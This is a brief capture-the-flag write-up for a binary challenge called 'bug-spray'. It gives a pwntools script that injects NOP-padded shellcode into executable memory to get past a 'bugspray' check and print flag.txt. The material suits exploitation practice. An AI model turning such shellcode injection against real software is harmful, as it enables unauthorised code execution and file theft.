# bug-spray

https://youtu.be/qA6ajf7qZtQ?si=xhQP5Miy1iTUheHW&t=1942

- ghidra, handrolled asm
- chunk of memory allocated with read/write/execute
- need to bypass `bugspray` function
- gdb can't actually be used by design

```py
libc = elf.libc
p = elf.process

shellcode = pwn.asm(
    # pwn.shellcode.trap()
    # pwn.shellcraft.write(1, 'rsp', 0x10)

    pwn.shellcraft.open('./flag.txt') +
    pwn.shellcraft.read(3, 'rsp', 64) +
    pwn.shellcraft.write(1, 'rsp', 64)
).ljust(0x44, b'\x90')

# ljust to make sure bugspray isnt triggered

p.sendlineafter(b'>>>', shellcode)
p.interactive()
```
